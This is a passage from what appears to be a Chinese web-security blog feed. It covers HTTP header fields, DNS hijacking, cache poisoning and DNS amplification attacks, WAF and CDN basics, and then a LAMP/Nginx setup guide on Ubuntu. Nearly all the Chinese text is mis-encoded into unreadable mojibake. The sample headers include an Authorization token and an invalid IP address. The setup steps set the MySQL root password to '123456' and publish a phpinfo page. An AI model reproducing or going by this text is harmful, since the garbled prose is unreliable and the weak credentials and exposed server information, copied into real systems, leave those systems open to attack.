è®ºæ˜¯è¯·æ±‚æŠ¥æ–‡è¿˜æ˜¯å“åº”æŠ¥æ–‡ï¼Œè™½ç„¶åˆ†åˆ«ç”±ä»¥ä¸Šäº”ä¸ªéƒ¨åˆ†ç»„æˆï¼Œä½†æ˜¯åœ¨ä¸€å®šæƒ…å†µä¸‹æœ‰äº›å¹¶ä¸æ˜¯å¿…é¡»è¦çš„ï¼Œä½†æ˜¯å¯¹äºï¼šGeneral-header(é€šç”¨å¤´éƒ¨)ã€è¯·æ±‚å¤´ï¼ˆå®¢æˆ·ç«¯-&gt;æœåŠ¡å™¨[Request Header])ã€å“åº”å¤´(æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯[Response Header]) è¿™ä¸‰éƒ¨åˆ†æ˜¯å¿…é¡»è¦æœ‰çš„ã€‚äºæ˜¯æ‹¿ä¸€ä¸ªå®ä¾‹æ¥å¯¹è¿™ä¸‰éƒ¨åˆ†çš„å†…å®¹è¿›è¡Œè¯´æ˜è®°å½•ï¼š</p><p>ï¼ˆ1ï¼‰<strong>General-header(é€šç”¨å¤´éƒ¨)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http:&#x2F;&#x2F;115.148.141.110:8980&#x2F;v1&#x2F;purchase&#x2F;list   ã€€ # è¯·æ±‚çš„URLåœ°å€ï¼ˆåŒ…å«è¯·æ±‚ç±»å‹ã€è¯·æ±‚åŸŸåã€è¯·æ±‚ç«¯å£ã€è¯·æ±‚åœ°å€ï¼‰</span><br><span class="line">Request Method: POST            ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # è¯·æ±‚æ–¹å¼</span><br><span class="line">Status Code: 200 OK                                            # å“åº”çš„çŠ¶æ€ç ã€ç»“æœ </span><br><span class="line">Remote Address: 127.0.0.1:8899                                 # è¯·æ±‚çš„è¿œç¨‹åœ°å€       </span><br><span class="line">Referrer Policy: no-referrer-when-downgrade                    # referrerç­–ç•¥ï¼ˆäº”ç§æ–¹æ³•ï¼‰</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰<strong>è¯·æ±‚å¤´ï¼ˆå®¢æˆ·ç«¯-&gt;æœåŠ¡å™¨[Request Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;v1&#x2F;purchase&#x2F;list HTTP&#x2F;1.1       # è¯·æ±‚æ–¹å¼ã€è¯·æ±‚åœ°å€ã€è¯·æ±‚æ‰€ä½¿ç”¨çš„åè®®å’Œç‰ˆæœ¬</span><br><span class="line">Host: 115.157.151.673:8180            # ç›®æ ‡ä¸»æœºåœ°å€å’Œç«¯å£å·</span><br><span class="line">Connection: keep-alive                # ç»´æŠ¤å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„è¿æ¥å…³ç³» </span><br><span class="line">Content-Length: 68                    # æè¿°HTTPæ¶ˆæ¯å®ä½“çš„ä¼ è¾“é•¿åº¦</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01     #å‘é€ç«¯ï¼ˆå®¢æˆ·ç«¯ï¼‰å¸Œæœ›æ¥å—çš„æ•°æ®ç±»å‹ã€q æ˜¯æƒé‡ç³»æ•°ï¼ŒèŒƒå›´ 0 &#x3D;&lt; q &lt;&#x3D; 1ï¼Œq å€¼è¶Šå¤§ï¼Œè¯·æ±‚è¶Šå€¾å‘äºè·å¾—å…¶â€œ;â€ä¹‹å‰çš„ç±»å‹è¡¨ç¤ºçš„å†…å®¹</span><br><span class="line">Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # æµè§ˆå™¨åœ¨referrerå­—æ®µä¸­åªæ˜¾ç¤ºæºç½‘ç«™çš„æºåœ°å€ï¼ˆå³åè®®ã€åŸŸåã€ç«¯å£ï¼‰ï¼Œè€Œä¸åŒ…æ‹¬å®Œæ•´çš„è·¯å¾„  </span><br><span class="line">Authorization: c81e7286507f4aa4b6179f4c381b4c64ã€€ã€€ã€€ã€€ã€€ã€€ã€€# è¯·æ±‚æ‰€éœ€çš„è®¤è¯ä¿¡æ¯</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.100 Safari&#x2F;537.36          # æºå¸¦å½“å‰çš„ç”¨æˆ·ä»£ç†ä¿¡æ¯ï¼Œä¸€èˆ¬åŒ…å«æµè§ˆå™¨ã€æµè§ˆå™¨å†…æ ¸å’Œæ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬å‹å·ä¿¡æ¯ã€‚</span><br><span class="line">Content-Type: application&#x2F;json   ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€# è¯·æ±‚å®ä½“ï¼Œæ–‡æ¡£ç±»å‹</span><br><span class="line">Referer: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007&#x2F;procurement&#x2F;order?_t&#x3D;756512&amp;_winid&#x3D;w9290         #  å¸¸ç”¨äºåŒæºé™åˆ¶ç­–ç•¥ï¼Œè¡¨ç¤ºè¯·æ±‚å‘èµ·æ¥æºçš„URIï¼Œä¹Ÿå°±æ˜¯å½“å‰é¡µé¢èµ„æºçš„çˆ¶é¡µé¢ã€‚é€šè¿‡è¿½è¸ªRefererå¯å¾—å‡ºèµ„æºé¡µé¢ä¹‹é—´å¤æ‚çš„è·³è½¬é“¾ã€‚</span><br><span class="line">Accept-Encoding: gzip, deflate        # å®¢æˆ·ç«¯æ¥æ”¶ç¼–ç ç±»å‹ï¼Œä¸€äº›ç½‘ç»œå‹ç¼©æ ¼å¼ï¼š gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9       # å®¢æˆ·ç«¯æ¥æ”¶çš„è¯­è¨€ç±»å‹ ã€ä¸­æ–‡</span><br></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰<strong>å“åº”å¤´(æœåŠ¡ç«¯-&gt;å®¢æˆ·ç«¯[Response Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK             # è¯·æ±‚åè®®ä»¥åŠæœ¬ç‰ˆã€è¯·æ±‚çŠ¶æ€ç </span><br><span class="line">Date: Tue, 02 Jul 2019 14:07:31 GMT # æœåŠ¡ç«¯å“åº”å®¢æˆ·ç«¯çš„å†…å®¹è¿‡æœŸæ—¶é—´</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8     # æœåŠ¡ç«¯å‘é€çš„ç±»å‹åŠé‡‡ç”¨çš„ç¼–ç æ–¹å¼</span><br><span class="line">Server: Kestrel         ã€€ã€€ã€€ã€€ã€€ã€€ã€€# WEB æœåŠ¡å™¨ æœåŠ¡ç«¯çš„WebæœåŠ¡ç«¯å</span><br><span class="line">Vary: Origin  # WEBæœåŠ¡å™¨ç”¨è¯¥å¤´éƒ¨çš„å†…å®¹å‘Šè¯‰ Cache æœåŠ¡å™¨ï¼Œåœ¨ä»€ä¹ˆæ¡ä»¶ä¸‹æ‰èƒ½ç”¨æœ¬å“åº”æ‰€è¿”å›çš„å¯¹è±¡å“åº”åç»­çš„è¯·æ±‚</span><br><span class="line">Access-Control-Allow-Credentials: trueã€€ã€€# å…è®¸è¿è¡Œå®¢æˆ·ç«¯æºå¸¦è¯ä¹¦å¼è®¿é—®   </span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007</span><br><span class="line">Content-Length: 33310ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ # å…è®¸æŒ‡å®šçš„åŸŸåã€åœ°å€è®¿é—®</span><br></pre></td></tr></table></figure><h1 id="æ½œåœ¨çš„å®‰å…¨é—®é¢˜"><a href="#æ½œåœ¨çš„å®‰å…¨é—®é¢˜" class="headerlink" title="æ½œåœ¨çš„å®‰å…¨é—®é¢˜"></a>æ½œåœ¨çš„å®‰å…¨é—®é¢˜</h1><p><strong>DNS è§£æçš„å®‰å…¨é—®é¢˜ï¼š</strong></p><ul><li><p><strong>DNSåŸŸååŠ«æŒ</strong>ï¼Œæ”»å‡»è€…é€šè¿‡å¯¹åŸŸåè§£ææœåŠ¡å™¨çš„æ”»å‡»æˆ–ä¼ªé€ ï¼ŒæŠŠç›®æ ‡ç½‘ç«™çš„åŸŸåè§£æåˆ°é”™è¯¯ï¼ˆé»‘å®¢å‡†å¤‡ï¼‰çš„é¡µé¢ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„æŸç§ç›®çš„ã€‚</p><p>é˜²èŒƒæªæ–½ï¼šè¿›è¡ŒIPåœ°å€å’ŒMACåœ°å€çš„ç»‘å®šï¼›ä½¿ç”¨åŸŸåç³»ç»Ÿçš„å®‰å…¨åè®®ï¼›å¯¹DNSæ•°æ®åŒ…è¿›è¡Œç›‘æµ‹ï¼›ä½¿ç”¨IPè¿›è¡Œè®¿é—®ç­‰ã€‚</p></li><li><p><strong>DNS ç¼“å­˜æŠ•æ¯’</strong>ï¼Œé€šè¿‡åˆ©ç”¨ç½‘æ°‘ISPç«¯çš„DNSç¼“å­˜æœåŠ¡å™¨çš„æ¼æ´è¿›è¡Œæ”»å‡»æˆ–æ§åˆ¶ï¼Œä»è€Œæ”¹å˜è¯¥ISPå†…çš„ç”¨æˆ·è®¿é—®åŸŸåçš„å“åº”ç»“æœ;æˆ–è€…é€šè¿‡åˆ©ç”¨ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨ä¸Šçš„æ¼æ´ï¼Œå¦‚å½“ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨åŒæ—¶å¯ä»¥è¢«å½“ä½œç¼“å­˜æœåŠ¡å™¨ä½¿ç”¨ï¼Œé»‘å®¢å¯ä»¥å®ç°ç¼“å­˜æŠ•æ¯’ï¼Œå°†é”™è¯¯çš„åŸŸåçºªå½•å­˜å…¥ç¼“å­˜ä¸­ï¼Œä»è€Œä½¿æ‰€æœ‰ä½¿ç”¨è¯¥ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·å¾—åˆ°é”™è¯¯çš„DNSè§£æç»“æœã€‚</p></li><li><p><strong>DNSæ‹’ç»æœåŠ¡æ”»å‡»</strong>ï¼Œåˆ©ç”¨DNSè½¯ä»¶ç‰ˆæœ¬æ¼æ´æ”»å‡»ï¼›åˆ©ç”¨åƒµå°¸ç½‘ç»œä¸­å¤§é‡çš„è¢«æ§ä¸»æœºï¼Œä¼ªè£…æˆè¢«æ”»å‡»ä¸»æœºï¼Œåœ¨ç‰¹å®šæ—¶é—´ç‚¹ä¸Šï¼Œè¿ç»­å‘å¤šä¸ªå…è®¸é€’å½’æŸ¥è¯¢çš„DNSæœåŠ¡å™¨å‘é€å¤§é‡çš„DNSæŸ¥è¯¢è¯·æ±‚ï¼Œè¿«ä½¿å…¶æä¾›åº”ç­”æœåŠ¡ï¼Œç»DNSæœåŠ¡å™¨æ”¾å¤§åçš„å¤§é‡åº”ç­”æ•°æ®å‘é€åˆ°è¢«æ”»å‡»ä¸»æœºï¼Œå½¢æˆæ”»å‡»æµé‡ï¼Œå¯¼è‡´å…¶æ— æ³•æä¾›æ­£å¸¸æœåŠ¡ç”šè‡³ç˜«ç—ªã€‚</p><blockquote><p>ç›¸å…³æ–‡ç« åˆ†äº«ï¼š<a href="https://mp.weixin.qq.com/s/ByOpNmN6JIMRdTT8E9DkoQ">çœŸçš„é»‘å®¢èƒ½è®©ä½ åˆ†åˆ†é’Ÿå¼€è¿›æ²Ÿé‡Œï¼Œä½†ä»–ä»¬ä¸å±‘äºæ­¤</a></p></blockquote></li></ul><p><strong>HTTPçš„å®‰å…¨é—®é¢˜ï¼š</strong></p><ul><li>Httpçš„é€šä¿¡æ˜¯æ˜æ–‡çš„ï¼Œå­˜åœ¨è¢«çªƒå¬çš„é£é™©</li><li>æ— æ³•ç¡®è®¤é€šä¿¡åŒæ–¹èº«ä»½ï¼Œæœ‰å¯èƒ½ä¼šè¢«äººä¼ªé€ </li><li>æ— æ³•éªŒè¯æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œæ— æ³•éªŒè¯æ˜¯å¦è¢«ç¯¡æ”¹è¿‡</li></ul><h1 id="WAFå’ŒCDN"><a href="#WAFå’ŒCDN" class="headerlink" title="WAFå’ŒCDN"></a>WAFå’ŒCDN</h1><ul><li><strong>WAF</strong></li></ul><p>WAF(Web Application Firewall)ç§°ä¸ºwebåº”ç”¨é˜²ç«å¢™ï¼Œæ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP,HTTPSçš„å®‰å…¨ç­–ç•¥ï¼Œæ¥ä¸“é—¨å¯¹webåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ï¼Œå¯¹æ¥è‡ªWebåº”ç”¨ç¨‹åºå®¢æˆ·ç«¯çš„å„ç±»è¯·æ±‚è¿›è¡Œå†…å®¹æ£€æµ‹å’ŒéªŒè¯ï¼Œç¡®ä¿å…¶å®‰å…¨æ€§ä¸åˆæ³•æ€§ï¼Œå¯¹éæ³•çš„è¯·æ±‚äºˆä»¥å®æ—¶é˜»æ–­ï¼Œä¸ºWebåº”ç”¨æä¾›é˜²æŠ¤ã€‚é€šä¿—çš„è¯´ï¼ŒWAFç±»ä¼¼äºåœ°é“ç«™çš„å®‰æ£€ï¼Œå¯¹äºHTTPè¯·æ±‚è¿›è¡Œå¿«é€Ÿå®‰å…¨æ£€æŸ¥ï¼Œé€šè¿‡è§£æHTTPæ•°æ®ï¼Œåœ¨ä¸åŒçš„å­—æ®µåˆ†åˆ«åœ¨ç‰¹å¾ã€è§„åˆ™ç­‰ç»´åº¦è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­çš„ç»“æœä½œä¸ºæ˜¯å¦æ‹¦æˆªçš„ä¾æ®ä»è€Œå†³å®šæ˜¯å¦æ”¾è¡Œã€‚</p><p> WAF å¯ä»¥ç”¨æ¥å±è”½å¸¸è§çš„ç½‘ç«™æ¼æ´æ”»å‡»ï¼Œå¦‚SQLæ³¨å…¥ï¼ŒXMLæ³¨å…¥ã€XSSç­‰ã€‚ä¸€èˆ¬é’ˆå¯¹çš„æ˜¯åº”ç”¨å±‚è€Œéç½‘ç»œå±‚çš„å…¥ä¾µï¼Œä»æŠ€æœ¯è§’åº¦åº”è¯¥ç§°ä¹‹ä¸ºWeb IPSã€‚å…¶é˜²æŠ¤é‡ç‚¹æ˜¯SQLæ³¨å…¥ã€‚</p><p>  Webé˜²ç«å¢™äº§å“éƒ¨ç½²åœ¨WebæœåŠ¡å™¨çš„å‰é¢ï¼Œä¸²è¡Œæ¥å…¥ï¼Œä¸ä»…åœ¨ç¡¬ä»¶æ€§èƒ½ä¸Šè¦æ±‚é«˜ï¼Œè€Œä¸”ä¸èƒ½å½±å“WebæœåŠ¡ï¼Œæ‰€ä»¥HAåŠŸèƒ½ã€BypassåŠŸèƒ½éƒ½æ˜¯å¿…é¡»çš„ï¼Œè€Œä¸”è¿˜è¦ä¸è´Ÿè½½å‡è¡¡ã€Web Cacheç­‰WebæœåŠ¡å™¨å‰çš„å¸¸è§çš„äº§å“åè°ƒéƒ¨ç½²ã€‚</p><ul><li><strong>CDN</strong></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222175832644.png" alt="image-20201222175832644"></p><p>è¿™ä¸ªurlä¸­æœ‰cdnå­—æ ·ã€‚ä»€ä¹ˆæ˜¯CDN? å¦‚æœæˆ‘åœ¨å¹¿å·è®¿é—®æ·˜å®ï¼Œè·¨çœçš„é€šä¿¡å¿…ç„¶é€ æˆå»¶è¿Ÿï¼Œå¦‚æœæ·˜å®åœ¨å¹¿ä¸œå»ºç«‹ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé™æ€èµ„æºæˆ‘å¯ä»¥ç›´æ¥ä»å°±è¿‘çš„å¹¿ä¸œæœåŠ¡å™¨è·å–ï¼Œå¿…ç„¶èƒ½æé«˜æ•´ä¸ªç½‘ç«™çš„æ‰“å¼€é€Ÿåº¦ï¼Œè¿™å°±å«åšCDNã€‚CDNå«åšå†…å®¹åˆ†å‘ç½‘ç»œï¼Œæ˜¯ä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚</p><p>CDNçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDNæ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚</p><p>CDNå°†ç”¨æˆ·ç»å¸¸è®¿é—®çš„é™æ€æ•°æ®èµ„æºç›´æ¥ç¼“å­˜åˆ°èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šï¼Œå½“ç”¨æˆ·å†æ¬¡è¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥åˆ†å‘åˆ°åœ¨ç¦»ç”¨æˆ·è¿‘çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šå“åº”ç»™ç”¨æˆ·ï¼Œå½“ç”¨æˆ·æœ‰å®é™…æ•°æ®äº¤äº’æ—¶æ‰ä¼šä»è¿œç¨‹WebæœåŠ¡å™¨ä¸Šå“åº”ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜ç½‘ç«™çš„å“åº”é€Ÿåº¦åŠç”¨æˆ·ä½“éªŒã€‚CDNç½‘ç»œçš„è¯ç”Ÿå¤§å¤§åœ°æ”¹å–„äº†äº’è”ç½‘çš„æœåŠ¡è´¨é‡ï¼Œå› æ­¤ä¼ ç»Ÿçš„å¤§å‹ç½‘ç»œè¿è¥å•†çº·çº·å¼€å§‹å»ºè®¾è‡ªå·±çš„CDNç½‘ç»œã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://baike.baidu.com/tashuo/browse/content?id=46cc373d43f2830a7bae71ce&lemmaId=86062&fromLemmaModule=pcRight">ä»€ä¹ˆæ˜¯åŸŸåï¼Ÿæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦ä¿æŠ¤å®ƒï¼Ÿ</a></p><p><a href="https://blog.csdn.net/li_adou/article/details/78252202">åŸŸåè§£æçš„è®°å½•ç±»å‹</a></p><p><a href="https://www.cnblogs.com/chalan630/p/12866009.html">web å®‰å…¨ä¹‹é¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a></p><p><a href="https://blog.csdn.net/u010516151/article/details/102855151">web é¡µé¢è§£æçš„æµç¨‹æ€»ç»“</a></p><p><a href="https://blog.csdn.net/qq_35732147/article/details/80661994">ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼ˆURLï¼‰è¯¦è§£</a></p><p><a href="https://www.cnblogs.com/wangyuyang1016/p/11681957.html#_caption2">Webé¡µé¢è§£æè¿‡ç¨‹ï¼ˆæµ…ï¼‰</a></p><p><a href="https://blog.csdn.net/JackLiu16/article/details/79426241">DNSæ¬ºéª—æ”»å‡»åŠå¦‚ä½•é˜²æŠ¤</a></p><p><a href="https://blog.csdn.net/gufenchen/article/details/93485351">WAFä»‹ç»</a></p><p><a href="https://blog.csdn.net/dushan1234/article/details/98073575">æ‰“å¼€ä¸€ä¸ªç½‘é¡µçš„å…¨è¿‡ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webç¯å¢ƒæ­å»ºè®°å½•</title>
      <link href="posts/60533.html"/>
      <url>posts/60533.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>LAMPç¯å¢ƒæ­å»º ï¼šLinux + Apache + MySQL + PHP</p><p>æ­å»ºæ–¹å¼ï¼šåŒ…ç®¡ç†å®‰è£…ï¼ˆç”¨apt-geté€ä¸ªå®‰è£…Apacheã€MySQLã€PHPï¼‰</p><p>ä»¥ä¸‹æ“ä½œåœ¨Ubuntu20.04ç³»ç»Ÿä¸Šè¿›è¡Œ</p></blockquote><h1 id="0x01-å®‰è£…Apache"><a href="#0x01-å®‰è£…Apache" class="headerlink" title="0x01 å®‰è£…Apache"></a>0x01 å®‰è£…Apache</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®<code>127.0.0.1</code>,å‡ºç°å¦‚ä¸‹é¡µé¢åˆ™ä»£è¡¨å®‰è£…æˆåŠŸ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210804171612211.png" alt="image-20210804171612211"></p><h1 id="0x02-å®‰è£…MySQL"><a href="#0x02-å®‰è£…MySQL" class="headerlink" title="0x02 å®‰è£…MySQL"></a>0x02 å®‰è£…MySQL</h1><p>å®‰è£…MySQLæœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure><p>å®‰è£…MySQLå®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-client</span><br></pre></td></tr></table></figure><p>ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•MySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root</span><br></pre></td></tr></table></figure><p>ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç â€™123456â€™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;</span><br></pre></td></tr></table></figure><p>é€€å‡ºMySQL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure><p>åç»­å†ç™»å½•MySQLéœ€ä½¿ç”¨åˆšæ‰è®¾ç½®çš„å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: </span><br></pre></td></tr></table></figure><h1 id="0x03-å®‰è£…PHP"><a href="#0x03-å®‰è£…PHP" class="headerlink" title="0x03 å®‰è£…PHP"></a>0x03 å®‰è£…PHP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure><p>åœ¨ <code>/var/www/html</code> ä¸‹æ–°å»ºä¸€ä¸ª<code>phpinfo.php</code> æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®æ­¤æ–‡ä»¶ï¼Œè‹¥èƒ½å¤Ÿçœ‹åˆ°PHPç›¸å…³ä¿¡æ¯è¯´æ˜PHPå®‰è£…æˆåŠŸä¸”PHPä»£ç èƒ½åœ¨æ­¤ç¯å¢ƒè¿è¡Œ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805094043070.png" alt="image-20210805094043070"></p><blockquote><p>åˆ°æ­¤ï¼ŒLAMPç¯å¢ƒç®—æ˜¯åˆæ­¥éƒ¨ç½²å¥½äº†ã€‚ä¸‹é¢ï¼Œç®€è¦è®°å½•ä¸‹Nginxçš„å®‰è£…ï¼ŒPHPè¿æ¥MySQLçš„æ“ä½œï¼Œä»¥åŠç›¸å…³åŠ å›ºæŠ€æœ¯ã€‚</p></blockquote><h1 id="0x04-å®‰è£…Nginx"><a href="#0x04-å®‰è£…Nginx" class="headerlink" title="0x04 å®‰è£…Nginx"></a>0x04 å®‰è£…Nginx</h1><p>Nginxä¸Apacheéƒ½èƒ½æä¾›WebæœåŠ¡ï¼Œä¸¤è€…åŒºåˆ«è§ <a href="https://blog.csdn.net/lilygg/article/details/87873964">æµ…æNginxä¸Apacheçš„åŒºåˆ«</a></p><p>æœ‰ä¸€ç‚¹è¦è¯´æ˜çš„æ˜¯ï¼ŒApacheå¯¹PHPæ”¯æŒæ¯”è¾ƒç®€å•ï¼Œä½†Nginxæœ¬èº«ä¸ä¼šå¯¹phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œéœ€è¦é…åˆphp-fpmï¼ˆç¬¬ä¸‰æ–¹çš„fastcgiè¿›ç¨‹ç®¡ç†å™¨ï¼‰æ‰èƒ½å®ç°å¯¹PHPçš„è§£ææ”¯æŒã€‚</p><p>å…³äºè¿™ä¸€ç‚¹è¯¦æƒ…å¯è§ <a href="https://blog.csdn.net/hguisu/article/details/8930668">Nginxå·¥ä½œåŸç†å’Œä¼˜åŒ–æ€»ç»“</a></p><p>æ³¨æ„ï¼Œå¦‚æœApacheæœåŠ¡å·²ç»å¼€å¯ï¼Œåœ¨ä½¿ç”¨Nginxå‰éœ€æ‰‹åŠ¨å…³é—­ApacheæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br></pre></td></tr></table></figure><p>å®‰è£…Nginx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>å¦‚æœä¹‹å‰æ²¡æœ‰å®‰è£…è¿‡Apacheï¼Œç›´æ¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®<code>127.0.0.1</code>,å‡ºç°å¦‚ä¸‹é¡µé¢åˆ™ä»£è¡¨nginxå®‰è£…æˆåŠŸã€‚è‹¥å·²å®‰è£…è¿‡Apacheï¼Œåˆ™è®¿é—®<code>127.0.0.1/index.nginx-debian.html</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805105118644.png" alt="image-20210805105118644"></p><p>ä½†æ­¤æ—¶è¿˜æ— æ³•è¿è¡Œphpä»£ç ï¼Œè¿˜éœ€å®‰è£…php-fpm</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-fpm</span><br></pre></td></tr></table></figure><p>ä»¥åŠä¿®æ”¹nginxé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210805121731351.png" alt="image-20210805121731351"></p><p><code>:wq</code>,ä¿å­˜é€€å‡ºåé‡å¯nginxæœåŠ¡ï¼Œä½¿ä¿®æ”¹è¿‡çš„é…ç½®ä¿¡æ¯ç”Ÿæ•ˆ</p><figure 